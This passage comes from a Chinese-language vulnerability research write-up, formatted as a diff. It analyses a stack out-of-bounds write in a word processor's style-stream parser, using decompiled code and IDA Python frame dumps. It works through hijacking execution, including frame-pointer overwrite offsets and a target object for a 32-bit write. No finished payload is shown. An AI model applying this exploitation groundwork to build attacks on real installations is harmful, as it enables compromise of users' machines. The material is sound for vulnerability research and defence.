-        if ( !arena_reader::read_ushort_779780(&lv_triple_80, &v25) )
-          goto LABEL_47;
-        lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(0)_14 = v25;
-        goto LABEL_51;
+  while ( lvw_case_84 != 0xFFFF )                                                               // Keep reading records until 0xFFFF
+  {
+    switch ( lvw_case_84 )
+    {
+      case 0u:                                                                                  // Case 0-4,6,8,9 are similar.
+        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
+          goto LABEL_47;
+        LOWORD(lv_size_74) = lv_size_74 - 2;
+        if ( !arena_reader::read_ushort_779780(&lv_triple_80, &v25) )
+          goto LABEL_47;
+        lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(0)_14 = v25;
+        goto LABEL_51;
 ...
-      case 5u:                                                                                  // Case 5
-        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
-          goto LABEL_47;
-        LOWORD(lv_size_74) = lv_size_74 - 2;
+      case 5u:                                                                                  // Case 5
+        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
+          goto LABEL_47;
+        LOWORD(lv_size_74) = lv_size_74 - 2;
 ...
-        wstringtoggle_7fb182::initialize_7fb182(&v15, lv_wstring(28)_54);
-        LOBYTE(v34) = 0;
-        object_9d15a0::moveinto_field(20,2c)_6c0780(lv_objects(6)_6c[lvw_index_70], v15);
-        goto LABEL_51;
+        wstringtoggle_7fb182::initialize_7fb182(&v15, lv_wstring(28)_54);
+        LOBYTE(v34) = 0;
+        object_9d15a0::moveinto_field(20,2c)_6c0780(lv_objects(6)_6c[lvw_index_70], v15);
+        goto LABEL_51;
 ...
-      case 7u:                                                                                  // Case 7
-        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
-          goto LABEL_47;
-        lv_size_74 += 0xFFFC;
-        if ( !arena_reader::read_int_6b5bc1(&lv_triple_80, &v17) )
-          goto LABEL_47;
-        lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(7)_38 = v17;
-        goto LABEL_51;
+      case 7u:                                                                                  // Case 7
+        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
+          goto LABEL_47;
+        lv_size_74 += 0xFFFC;
+        if ( !arena_reader::read_int_6b5bc1(&lv_triple_80, &v17) )
+          goto LABEL_47;
+        lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(7)_38 = v17;
+        goto LABEL_51;
 ...
-      default:
-        if ( !arena_reader::read_ushort_779780(&lv_triple_80, &lv_size_74) )
-          goto LABEL_47;
-        break;
-    }
-    while ( lv_size_74 )
-    {
-      if ( !arena_reader::read_byte_405b6c(&lv_triple_80, &lvb_85) )
-        goto LABEL_47;
-      lv_size_74 += 0xFFFF;
-    }
+      default:
+        if ( !arena_reader::read_ushort_779780(&lv_triple_80, &lv_size_74) )
+          goto LABEL_47;
+        break;
+    }
+    while ( lv_size_74 )
+    {
+      if ( !arena_reader::read_byte_405b6c(&lv_triple_80, &lvb_85) )
+        goto LABEL_47;
+      lv_size_74 += 0xFFFF;
+    }
 ...
-  }
+  }
 ...
 }
 ```  
@@ -496,30 +496,30 @@ object_9d15a0.
 ```
 Python>struc.by('object_9d15a0').members
 <class 'structure' name='object_9d15a0' size=0x68>
-[0]  0+0x4                     int 'p_vftable_0' (<class 'int'>, 4)     # [vftable] 0x3c4515a0
-[1]  4+0x1c JSFC::CCmdTarget::data 'v_data_4'    <class 'structure' name='JSFC::CCmdTarget::data' offset=0x4 size=0x1c>
-[2] 20+0x48    object_9d15a0::data 'v_data_20'   <class 'structure' name='object_9d15a0::data' offset=0x20 size=0x48>
- 
+[0]  0+0x4                     int 'p_vftable_0' (<class 'int'>, 4)     # [vftable] 0x3c4515a0
+[1]  4+0x1c JSFC::CCmdTarget::data 'v_data_4'    <class 'structure' name='JSFC::CCmdTarget::data' offset=0x4 size=0x1c>
+[2] 20+0x48    object_9d15a0::data 'v_data_20'   <class 'structure' name='object_9d15a0::data' offset=0x20 size=0x48>
+ 
 Python>struc.by('object_9d15a0').members[2].type.members
 <class 'structure' name='object_9d15a0::data' offset=0x20 size=0x48>
-[0]  20+0x4                  int 'p_vftable_0'             (<class 'int'>, 4)
-[1]  24+0x4                  int 'p_vftable_4'             (<class 'int'>, 4)
-[2]  28+0x2              __int16 'field_8'                 (<class 'int'>, 2)
-[3]  2a+0x2              __int16 'field_A'                 (<class 'int'>, 2)
-[4]  2c+0x4                  int 'field_C'                 (<class 'int'>, 4)
-[5]  30+0x4       object_9d0d30* 'p_owner_10'              (<class 'type'>, 4)
-[6]  34+0x4                  int 'v_typeField(0)_14'       (<class 'int'>, 4)   # [styleType2008] 0x0
-[7]  38+0x4                  int 'v_typeField(1)_18'       (<class 'int'>, 4)   # [styleType2008] 0x1
-[8]  3c+0x4                  int 'v_typeField(2)_1c'       (<class 'int'>, 4)   # [styleType2008] 0x2
-[9]  40+0x4                  int 'v_typeField(3)_20'       (<class 'int'>, 4)   # [styleType2008] 0x3
-[10] 44+0x4                  int 'v_typeField(9)_24'       (<class 'int'>, 4)   # [styleType2008] 9
-[11] 48+0x4                  int 'v_typeField(4)_28'       (<class 'int'>, 4)   # [styleType2008] 0x4
+[0]  20+0x4                  int 'p_vftable_0'             (<class 'int'>, 4)
+[1]  24+0x4                  int 'p_vftable_4'             (<class 'int'>, 4)
+[2]  28+0x2              __int16 'field_8'                 (<class 'int'>, 2)
+[3]  2a+0x2              __int16 'field_A'                 (<class 'int'>, 2)
+[4]  2c+0x4                  int 'field_C'                 (<class 'int'>, 4)
+[5]  30+0x4       object_9d0d30* 'p_owner_10'              (<class 'type'>, 4)
+[6]  34+0x4                  int 'v_typeField(0)_14'       (<class 'int'>, 4)   # [styleType2008] 0x0
+[7]  38+0x4                  int 'v_typeField(1)_18'       (<class 'int'>, 4)   # [styleType2008] 0x1
+[8]  3c+0x4                  int 'v_typeField(2)_1c'       (<class 'int'>, 4)   # [styleType2008] 0x2
+[9]  40+0x4                  int 'v_typeField(3)_20'       (<class 'int'>, 4)   # [styleType2008] 0x3
+[10] 44+0x4                  int 'v_typeField(9)_24'       (<class 'int'>, 4)   # [styleType2008] 9
+[11] 48+0x4                  int 'v_typeField(4)_28'       (<class 'int'>, 4)   # [styleType2008] 0x4
 [12] 4c+0x8 wstringtoggle_7fb182 'v_typeFieldString(5)_2c' <class 'structure' name='wstringtoggle_7fb182' offset=0x4c size=0x8> # [styleType2008] 5
-[13] 54+0x4                  int 'v_typeField(6)_34'       (<class 'int'>, 4)   # [styleType2008] 0x6
-[14] 58+0x4                  int 'v_typeField(7)_38'       (<class 'int'>, 4)   # {'styleType2008': 7, 'note': 'writes 4b integer'}
-[15] 5c+0x4                  int 'v_typeField(8)_3c'       (<class 'int'>, 4)   # [styleType2008] 0x8
-[16] 60+0x4                  int 'field_40'                (<class 'int'>, 4)
-[17] 64+0x4     JSFC::SomeString 'v_string_44'             <class 'structure' name='JSFC::SomeString' offset=0x64 size=0x4>
+[13] 54+0x4                  int 'v_typeField(6)_34'       (<class 'int'>, 4)   # [styleType2008] 0x6
+[14] 58+0x4                  int 'v_typeField(7)_38'       (<class 'int'>, 4)   # {'styleType2008': 7, 'note': 'writes 4b integer'}
+[15] 5c+0x4                  int 'v_typeField(8)_3c'       (<class 'int'>, 4)   # [styleType2008] 0x8
+[16] 60+0x4                  int 'field_40'                (<class 'int'>, 4)
+[17] 64+0x4     JSFC::SomeString 'v_string_44'             <class 'structure' name='JSFC::SomeString' offset=0x64 size=0x4>
 ```  
   
   
@@ -552,78 +552,78 @@ object_9c2044::method_processStreams_77af0f。该深度代表应用程序中我�
   
 ```
 int __thiscall object_9c2044::method_processStreams_77af0f(
-        object_9c2044 *this,
-        JSVDA::object_OFRM *ap_oframe_0,
-        unsigned int av_documentType_4,
-        unsigned int av_flags_8,
-        struc_79aa9a *ap_stackobject_c,
-        int ap_null_10)
+        object_9c2044 *this,
+        JSVDA::object_OFRM *ap_oframe_0,
+        unsigned int av_documentType_4,
+        unsigned int av_flags_8,
+        struc_79aa9a *ap_stackobject_c,
+        int ap_null_10)
 {
 ...
-  lp_oframe_230 = ap_oframe_0;
-  lp_stackObject_234 = ap_stackobject_c;
+  lp_oframe_230 = ap_oframe_0;
+  lp_stackObject_234 = ap_stackobject_c;
 ...
-  if ( !lv_struc_24c.lv_flags_10 )
-  {
+  if ( !lv_struc_24c.lv_flags_10 )
+  {
 LABEL_42:
-    lv_struc_24c.field_14 = av_flags_8 & 0x800;
-    v10 = object_9c2044::parseStream(DocumentViewStyles)_3a790a(this, ap_oframe_0, av_documentType_4, av_flags_8);          // "DocumentViewStyles"
-    if ( v10 == 1 )
-    {
-      v10 = object_9c2044::parseStream(DocumentEditStyles)_3a6cb2(this, lp_oframe_230, av_documentType_4, av_flags_8);      // "DocumentEditStyles"
-      if ( v10 == 1 )
-      {
-        v10 = object_10cbd2::processSomeStreams_778971(
-                this->v_data_290.p_object_48,
-                lp_oframe_230,
-                av_documentType_4,
-                av_flags_8);
-        if ( v10 == 1 )
-        {
+    lv_struc_24c.field_14 = av_flags_8 & 0x800;
+    v10 = object_9c2044::parseStream(DocumentViewStyles)_3a790a(this, ap_oframe_0, av_documentType_4, av_flags_8);          // "DocumentViewStyles"
+    if ( v10 == 1 )
+    {
+      v10 = object_9c2044::parseStream(DocumentEditStyles)_3a6cb2(this, lp_oframe_230, av_documentType_4, av_flags_8);      // "DocumentEditStyles"
+      if ( v10 == 1 )
+      {
+        v10 = object_10cbd2::processSomeStreams_778971(
+                this->v_data_290.p_object_48,
+                lp_oframe_230,
+                av_documentType_4,
+                av_flags_8);
+        if ( v10 == 1 )
+        {
 ...
-          v10 = object_9c2044::decode_substream(Toolbox)_3a6a7b(this, lp_oframe_230);                                       // "Toolbox"
-          if ( v10 == 1 )
-          {
-            v10 = object_9c2044::decode_stream(DocumentMacro)_3a680a(this, lp_oframe_230, av_documentType_4);               // "DocumentMacro"
-            if ( v10 == 1 )
-            {
-              v10 = sub_3BE25803(this, lp_oframe_230, av_flags_8);
-              if ( v10 == 1 )
-              {
-                v10 = JSVDA::object_OFRM::decode_stream(Vision_Sidenote)_77310e(this, lp_oframe_230);                       // "Vision_Sidenote"
-                if ( v10 == 1 )
-                {
-                  v10 = object_9c2044::decode_stream(MergeDataName)_3a55d3(this, lp_oframe_230);                            // "MergeDataName"
-                  if ( v10 == 1 )
-                  {
-                    v10 = object_9c2044::decode_stream(HtmlAdditionalData)_3a5445(this, lp_oframe_230, av_documentType_4, lp_stackObject_234, 0);
+          v10 = object_9c2044::decode_substream(Toolbox)_3a6a7b(this, lp_oframe_230);                                       // "Toolbox"
+          if ( v10 == 1 )
+          {
+            v10 = object_9c2044::decode_stream(DocumentMacro)_3a680a(this, lp_oframe_230, av_documentType_4);               // "DocumentMacro"
+            if ( v10 == 1 )
+            {
+              v10 = sub_3BE25803(this, lp_oframe_230, av_flags_8);
+              if ( v10 == 1 )
+              {
+                v10 = JSVDA::object_OFRM::decode_stream(Vision_Sidenote)_77310e(this, lp_oframe_230);                       // "Vision_Sidenote"
+                if ( v10 == 1 )
+                {
+                  v10 = object_9c2044::decode_stream(MergeDataName)_3a55d3(this, lp_oframe_230);                            // "MergeDataName"
+                  if ( v10 == 1 )
+                  {
+                    v10 = object_9c2044::decode_stream(HtmlAdditionalData)_3a5445(this, lp_oframe_230, av_documentType_4, lp_stackObject_234, 0);
 ...
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
 ...
-  }
-  return v10;
+  }
+  return v10;
 }
- 
+ 
 /** Functions used to parse both the "DocumentViewStyles" and "DocumentEditStyles" streams. **/
 int __thiscall object_9c2044::parseStream(DocumentViewStyles)_3a790a(object_9c2044 *this, JSVDA::object_OFRM *ap_oframe_0, int av_documentType_4, int av_flags_8)
 {
-  object_9c2d50::field_397a8d::clear_3a7b8b(this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1dc);
-  this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1dc = 0;
-  return object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(this, ap_oframe_0, av_documentType_4, av_flags_8, 1, 0);
+  object_9c2d50::field_397a8d::clear_3a7b8b(this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1dc);
+  this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1dc = 0;
+  return object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(this, ap_oframe_0, av_documentType_4, av_flags_8, 1, 0);
 }
- 
+ 
 int __thiscall object_9c2044::parseStream(DocumentEditStyles)_3a6cb2(object_9c2044 *this, JSVDA::object_OFRM *ap_oframe_0, int av_documentType_4, int av_flags_8)
 {
-  object_9c2d50::field_397a8d::clear_3a7b8b(this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1d8);
-  this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1d8 = 0;
-  return object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(this, ap_oframe_0, av_documentType_4, av_flags_8, 2, 0);
+  object_9c2d50::field_397a8d::clear_3a7b8b(this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1d8);
+  this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1d8 = 0;
+  return object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(this, ap_oframe_0, av_documentType_4, av_flags_8, 2, 0);
 }
 ```  
   
@@ -642,36 +642,36 @@ DocumentEditStyles表明，没有任何内容被动态读取到堆或任何其�
 ```
 Python> func.frame(0x3BE11906).members
 <class 'structure' name='$ F3BE11906' offset=-0xcc size=0xe4>
-     -cc+0x10                                          [None, 16]
-[0]  -bc+0x4                  int 'var_B4'             (<class 'int'>, 4)
-[1]  -b8+0x4                  int 'var_B0'             (<class 'int'>, 4)
-[2]  -b4+0x2              __int16 'var_AC'             (<class 'int'>, 2)
+     -cc+0x10                                          [None, 16]
+[0]  -bc+0x4                  int 'var_B4'             (<class 'int'>, 4)
+[1]  -b8+0x4                  int 'var_B0'             (<class 'int'>, 4)
+[2]  -b4+0x2              __int16 'var_AC'             (<class 'int'>, 2)
 ...
-[13] -8d+0x1                 char 'lvb_85'             (<class 'int'>, 1)
-[14] -8c+0x2              __int16 'lvw_case_84'        (<class 'int'>, 2)
-     -8a+0x2                                           [None, 2]
-[15] -88+0xc         arena_reader 'lv_triple_80'       <class 'structure' name='arena_reader' offset=-0x88 size=0xc>
-[16] -7c+0x4                  int 'lv_size_74'         (<class 'int'>, 4)
-[17] -78+0x2              __int16 'lvw_index_70'       (<class 'int'>, 2)
-[18] -76+0x2              __int16 'var_6E'             (<class 'int'>, 2)
-[19] -74+0x18   object_9d15a0*[6] 'lv_objects(6)_6c'   [(<class 'type'>, 4), 6]
-[20] -5c+0x50         wchar_t[40] 'lv_wstring(28)_54'  [(<class 'int'>, 2), 40]
-[21]  -c+0x4                  int 'var_4'              (<class 'int'>, 4)
-[22]  -8+0x4              char[4] ' s'                 [(<class 'int'>, 1), 4]
-[23]  -4+0x4              char[4] ' r'                 [(<class 'int'>, 1), 4]
-[24]   0+0x4  JSVDA::object_OSEG* 'ap_oseg_0'          (<class 'type'>, 4)
-[25]   4+0x4                  int 'av_size_4'          (<class 'int'>, 4)
-[26]   8+0x4                  int 'av_someFlag_8'      (<class 'int'>, 4)
-[27]   c+0x4                  int 'av_documentType_c'  (<class 'int'>, 4)
-[28]  10+0x4                  int 'ap_nullobject_10'   (<class 'int'>, 4)
-[29]  14+0x4                 int* 'ap_unusedResult_14' (<class 'type'>, 4)
+[13] -8d+0x1                 char 'lvb_85'             (<class 'int'>, 1)
+[14] -8c+0x2              __int16 'lvw_case_84'        (<class 'int'>, 2)
+     -8a+0x2                                           [None, 2]
+[15] -88+0xc         arena_reader 'lv_triple_80'       <class 'structure' name='arena_reader' offset=-0x88 size=0xc>
+[16] -7c+0x4                  int 'lv_size_74'         (<class 'int'>, 4)
+[17] -78+0x2              __int16 'lvw_index_70'       (<class 'int'>, 2)
+[18] -76+0x2              __int16 'var_6E'             (<class 'int'>, 2)
+[19] -74+0x18   object_9d15a0*[6] 'lv_objects(6)_6c'   [(<class 'type'>, 4), 6]
+[20] -5c+0x50         wchar_t[40] 'lv_wstring(28)_54'  [(<class 'int'>, 2), 40]
+[21]  -c+0x4                  int 'var_4'              (<class 'int'>, 4)
+[22]  -8+0x4              char[4] ' s'                 [(<class 'int'>, 1), 4]
+[23]  -4+0x4              char[4] ' r'                 [(<class 'int'>, 1), 4]
+[24]   0+0x4  JSVDA::object_OSEG* 'ap_oseg_0'          (<class 'type'>, 4)
+[25]   4+0x4                  int 'av_size_4'          (<class 'int'>, 4)
+[26]   8+0x4                  int 'av_someFlag_8'      (<class 'int'>, 4)
+[27]   c+0x4                  int 'av_documentType_c'  (<class 'int'>, 4)
+[28]  10+0x4                  int 'ap_nullobject_10'   (<class 'int'>, 4)
+[29]  14+0x4                 int* 'ap_unusedResult_14' (<class 'type'>, 4)
 ```  
   
   
 此清单显示了属于包含我们的漏洞的方法的整个框架的布局  
 object_9d0d30::readStyleType(2008)_391906。在此布局中，该  
 lv_objects(6)_6c字段包含与索引一起使用的六元素指针数组。这意味着我们将取消引用相对于该数组的指针。该数组之后是金丝雀之前的缓冲区，保护调用者的帧指针和地址。如果我们交叉引用这个字段，我们可以看到它在 case 的处理过程中被引用  
-5。   
+5。   
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscyWsiaq2gqmicPJEbib0wGDicliaHDkAzEicVupV8YPs65eAPBGatqEnEYhPA/640?wx_fmt=png&from=appmsg "")  
   
@@ -712,21 +712,21 @@ __report_rangecheckfailure是
   
 **劫持执行**  
   
-由于我们可以在地址空间内的任何位置写入，因此我们可以覆盖一些全局指针来劫持执行。但是，如果我们检查直接范围内和周围的代码，则唯一可用于劫持的虚拟方法仅用于读取正在解析的当前流的内容。如果我们检查这些对象的内容，就会发现它们内部绝对不包含有用的数据，甚至不包含可能允许我们破坏应用程序其他部分的指针。因此，我们需要希望我们可以用流的内容影响的东西驻留在内存中的可预测位置。   
+由于我们可以在地址空间内的任何位置写入，因此我们可以覆盖一些全局指针来劫持执行。但是，如果我们检查直接范围内和周围的代码，则唯一可用于劫持的虚拟方法仅用于读取正在解析的当前流的内容。如果我们检查这些对象的内容，就会发现它们内部绝对不包含有用的数据，甚至不包含可能允许我们破坏应用程序其他部分的指针。因此，我们需要希望我们可以用流的内容影响的东西驻留在内存中的可预测位置。   
   
 ```
 Python> struc.by('JSVDA::object_OSEG')
-<class 'structure' name='JSVDA::object_OSEG' size=0x10>         # [alloc.tag] OSEG
- 
+<class 'structure' name='JSVDA::object_OSEG' size=0x10>         # [alloc.tag] OSEG
+ 
 Python> struc.by('JSVDA::object_OSEG').members
-<class 'structure' name='JSVDA::object_OSEG' size=0x10>         # [alloc.tag] OSEG
-[0]  0+0x4               int 'p_vftable_0' (<class 'int'>, 4)   # [vftable] 0x27818738
-[1]  4+0xc object_OSEG::data 'v_data_4'    <class 'structure' name='object_OSEG::data' offset=0x4 size=0xc>
- 
+<class 'structure' name='JSVDA::object_OSEG' size=0x10>         # [alloc.tag] OSEG
+[0]  0+0x4               int 'p_vftable_0' (<class 'int'>, 4)   # [vftable] 0x27818738
+[1]  4+0xc object_OSEG::data 'v_data_4'    <class 'structure' name='object_OSEG::data' offset=0x4 size=0xc>
+ 
 Python> struc.by('JSVDA::object_OSEG').members[1].type.members
 <class 'structure' name='object_OSEG::data' offset=0x4 size=0xc>
-[0]  4+0x4     int 'v_bucketIndex_0'    (<class 'int'>, 4)
-[1]  8+0x8 __int64 'v_currentOffset?_4' (<class 'int'>, 8)
+[0]  4+0x4     int 'v_bucketIndex_0'    (<class 'int'>, 4)
+[1]  8+0x8 __int64 'v_currentOffset?_4' (<class 'int'>, 8)
 ```  
   
   
@@ -746,7 +746,7 @@ Python> struc.by('JSVDA::object_OSEG').members[1].type.members
 Python> callstack = [0x3be11d03, 0x3be27501, 0x3be278b2, 0x3be2793e, 0x3c1fb083, 0x3c1fb495, 0x3c1fb4ef, 0x3be2795d]
 Python> list(map(function.address, callstack))
 [0x3be11906, 0x3be27048, 0x3be276be, 0x3be2790a, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
- 
+ 
 # Exchange each address in the backtrace with the function that owns it.
 Python> functions = list(map(function.address, callstack))
 Python> pp(list(map(function.name, functions)))
@@ -758,11 +758,11 @@ Python> pp(list(map(function.name, functions)))
  'object_9c2044::vmethod_processStreamsTwice_77b3ed',
  'object_9e9d90::processDocumentByType_77b4ab',
  'sub_3BE27954']
- 
+ 
 # Grab the frame for each function and align them contiguously.
 Python> frames = list(map(func.frame, functions))
 Python> contiguous = struc.right(frames[-1], frames[-1:])
- 
+ 
 # Display all frame pointers along with the offset needed to overwrite them.
 Python> for frame in contiguous: print("{:#x} : {}".format(frame.byname(' s').offset - 0x58, frame.byname(' s')))
 -0x640 : <member '$ F3BE11906. s' index=22 offset=-0x5e8 size=+0x4 typeinfo='char[4]'>
@@ -773,31 +773,31 @@ Python> for frame in contiguous: print("{:#x} : {}".format(frame.byname(' s').of
 -0x9c : <member '$ F3C1FB3ED. s' index=3 offset=-0x44 size=+0x4 typeinfo='char[4]'>
 -0x78 : <member '$ F3C1FB4AB. s' index=0 offset=-0x20 size=+0x4 typeinfo='char[4]'>
 -0x60 : <member '$ F3BE27954. s' index=0 offset=-0x8 size=+0x4 typeinfo='char[4]'>
- 
+ 
 # Gather them into a set.
 Python> offsets = set(item.byname(' s').offset - 0x58 for item in contiguous)
- 
+ 
 # Display each frame and any of its members that contain one of the determined offsets.
 Python> for frame in contiguous: print(frame), frame.members.list(offset=offsets), print()
 <class 'structure' name='$ F3BE11906' offset=-0x6ac size=0xe4>
-[20] -63c+0x50         wchar_t[40] 'lv_wstring(28)_54'  [(<class 'int'>, 2), 40]
- 
+[20] -63c+0x50         wchar_t[40] 'lv_wstring(28)_54'  [(<class 'int'>, 2), 40]
+ 
 <class 'structure' name='$ F3BE27048' offset=-0x5c8 size=0x38>
- 
+ 
 <class 'structure' name='$ F3BE276BE' offset=-0x590 size=0xa8>
-[12] -55c:+0x4           int 'var_58'      (<class 'int'>, 4)
-[20] -53c:+0x28 struc_3a9de4 'lv_struc_38' <class 'structure' name='struc_3a9de4' offset=-0x53c size=0x28>  # [note] Wanted object
- 
+[12] -55c:+0x4           int 'var_58'      (<class 'int'>, 4)
+[20] -53c:+0x28 struc_3a9de4 'lv_struc_38' <class 'structure' name='struc_3a9de4' offset=-0x53c size=0x28>  # [note] Wanted object
+ 
 <class 'structure' name='$ F3BE2790A' offset=-0x4e8 size=0x18>
- 
+ 
 <class 'structure' name='$ F3C1FAF0F' offset=-0x4d0 size=0x278>
-[7]  -4a0+0x228           object_2f27f8 'lv_object_22c'      <class 'structure' name='object_2f27f8' offset=-0x4a0 size=0x228>
- 
+[7]  -4a0+0x228           object_2f27f8 'lv_object_22c'      <class 'structure' name='object_2f27f8' offset=-0x4a0 size=0x228>
+ 
 <class 'structure' name='$ F3C1FB3ED' offset=-0x258 size=0x230>
-[1] -248+0x200        wchar_t[256] 'lv_wstring_204'    [(<class 'int'>, 2), 256]
- 
+[1] -248+0x200        wchar_t[256] 'lv_wstring_204'    [(<class 'int'>, 2), 256]
+ 
 <class 'structure' name='$ F3C1FB4AB' offset=-0x28 size=0x20>
- 
+ 
 <class 'structure' name='$ F3BE27954' offset=-0x8 size=0x18>
 ```  
   
@@ -810,26 +810,26 @@ lv_struc_38开始的字段 非常适合我们的 32 位写入。该字段属于�
 ```
 # Grab all of the calls for function 0x3BE276BE that do not use a register as its operand.
 Python> calls = {ins.op_ref(ref) for ref in function.calls(0x3BE276BE) if not isinstance(ins.op(ref), register_t)}
- 
+ 
 # List all functions that we selected.
 Python> db.functions.list(typed=True, ea=calls)
-[0]  +0x109b2a : 0x3bb89b2a..0x3bb89b9e : (1) FvD+ : __thiscall object_10cbd2::get_field(3c)_109b2a          : lvars:1c args:2 refs:100  exits:1
-[1]  +0x1329ce : 0x3bbb29ce..0x3bbb29e8 : (1) Fvt+ :    __cdecl object_OSEG::setCurrentStreamPosition_1329ce : lvars:00 args:5 refs:182  exits:1
-[2]  +0x132a07 : 0x3bbb2a07..0x3bbb2a15 : (1) Fvt+ :    __cdecl object_OSEG::destroy_132a07                  : lvars:00 args:1 refs:270  exits:1
-[3]  +0x132de4 : 0x3bbb2de4..0x3bbb2e41 : (1) FvT+ :    __cdecl object_OFRM::openStreamByName?_132de4        : lvars:08 args:4 refs:144  exits:1
-[4]  +0x1a9adb : 0x3bc29adb..0x3bc29bff : (1) FvD+ : __thiscall sub_3BC29ADB                                 : lvars:68 args:1 refs:7    exits:1
-[5]  +0x1cbf85 : 0x3bc4bf85..0x3bc4c3f2 : (1) FvD+ : __thiscall sub_3BC4BF85                                 : lvars:6c args:2 refs:6    exits:1
-[6]  +0x1d5697 : 0x3bc55697..0x3bc558b7 : (1) FvD+ : __thiscall object_9bd120::method_1d5697                 : lvars:8c args:1 refs:6    exits:1
-[7]  +0x2198ca : 0x3bc998ca..0x3bc9998f : (1) FvD+ : __thiscall sub_3BC998CA                                 : lvars:28 args:4 refs:38   exits:1
-[8]  +0x3a7048 : 0x3be27048..0x3be27664 : (1) FvT+ : __thiscall struc_3a9de4::parseStylesContent_3a7048      : lvars:18 args:7 refs:2    exits:1
-[9]  +0x3a7664 : 0x3be27664..0x3be276be : (1) FvT+ :    __cdecl object_OSEG::read_ushort_3a7664              : lvars:1c args:2 refs:90   exits:1
-[10] +0x3a9547 : 0x3be29547..0x3be2955d : (1) FvD+ : __thiscall sub_3BE29547                                 : lvars:00 args:3 refs:5    exits:1
-[11] +0x3a9638 : 0x3be29638..0x3be2963b : (1) FvD+ :  __unknown return_3a9638                                : lvars:00 args:0 refs:30   exits:1
-[12] +0x3a9de4 : 0x3be29de4..0x3be29e05 : (1) FvD* : __thiscall constructor_3a9de4                           : lvars:00 args:1 refs:7    exits:1
-[13] +0x7b15a6 : 0x3c2315a6..0x3c23161a : (1) FvD+ : __thiscall object_10cbd2::get_field(38)_7b15a6          : lvars:1c args:2 refs:36   exits:1
-[14] +0x7b9e07 : 0x3c239e07..0x3c239e7c : (1) FvD+ : __thiscall object_10cbd2::get_field(34)_7b9e07          : lvars:1c args:2 refs:98   exits:1
-[15] +0x8ea4fd : 0x3c36a4fd..0x3c36a50e : (1) LvD+ :  __unknown __EH_epilog3_GS                              : lvars:00 args:0 refs:2546 exits:0
- 
+[0]  +0x109b2a : 0x3bb89b2a..0x3bb89b9e : (1) FvD+ : __thiscall object_10cbd2::get_field(3c)_109b2a          : lvars:1c args:2 refs:100  exits:1
+[1]  +0x1329ce : 0x3bbb29ce..0x3bbb29e8 : (1) Fvt+ :    __cdecl object_OSEG::setCurrentStreamPosition_1329ce : lvars:00 args:5 refs:182  exits:1
+[2]  +0x132a07 : 0x3bbb2a07..0x3bbb2a15 : (1) Fvt+ :    __cdecl object_OSEG::destroy_132a07                  : lvars:00 args:1 refs:270  exits:1
+[3]  +0x132de4 : 0x3bbb2de4..0x3bbb2e41 : (1) FvT+ :    __cdecl object_OFRM::openStreamByName?_132de4        : lvars:08 args:4 refs:144  exits:1
+[4]  +0x1a9adb : 0x3bc29adb..0x3bc29bff : (1) FvD+ : __thiscall sub_3BC29ADB                                 : lvars:68 args:1 refs:7    exits:1
+[5]  +0x1cbf85 : 0x3bc4bf85..0x3bc4c3f2 : (1) FvD+ : __thiscall sub_3BC4BF85                                 : lvars:6c args:2 refs:6    exits:1
+[6]  +0x1d5697 : 0x3bc55697..0x3bc558b7 : (1) FvD+ : __thiscall object_9bd120::method_1d5697                 : lvars:8c args:1 refs:6    exits:1
+[7]  +0x2198ca : 0x3bc998ca..0x3bc9998f : (1) FvD+ : __thiscall sub_3BC998CA                                 : lvars:28 args:4 refs:38   exits:1
+[8]  +0x3a7048 : 0x3be27048..0x3be27664 : (1) FvT+ : __thiscall struc_3a9de4::parseStylesContent_3a7048      : lvars:18 args:7 refs:2    exits:1
+[9]  +0x3a7664 : 0x3be27664..0x3be276be : (1) FvT+ :    __cdecl object_OSEG::read_ushort_3a7664              : lvars:1c args:2 refs:90   exits:1
+[10] +0x3a9547 : 0x3be29547..0x3be2955d : (1) FvD+ : __thiscall sub_3BE29547                                 : lvars:00 args:3 refs:5    exits:1
+[11] +0x3a9638 : 0x3be29638..0x3be2963b : (1) FvD+ :  __unknown return_3a9638                                : lvars:00 args:0 refs:30   exits:1
+[12] +0x3a9de4 : 0x3be29de4..0x3be29e05 : (1) FvD* : __thiscall constructor_3a9de4                           : lvars:00 args:1 refs:7    exits:1
+[13] +0x7b15a6 : 0x3c2315a6..0x3c23161a : (1) FvD+ : __thiscall object_10cbd2::get_field(38)_7b15a6          : lvars:1c args:2 refs:36   exits:1
+[14] +0x7b9e07 : 0x3c239e07..0x3c239e7c : (1) FvD+ : __thiscall object_10cbd2::get_field(34)_7b9e07          : lvars:1c args:2 refs:98   exits:1
+[15] +0x8ea4fd : 0x3c36a4fd..0x3c36a50e : (1) LvD+ :  __unknown __EH_epilog3_GS                              : lvars:00 args:0 refs:2546 exits:0
+ 
 # Grab all our results that are typed, and emit their prototype.
 Python> for ea in db.functions(tag='__typeinfo__', ea=calls): print(function.tag(ea, '__typeinfo__'))
 object_9bd184 *__thiscall object_10cbd2::get_field(3c)_109b2a(object_10cbd2 *this, __int16 avw_0)
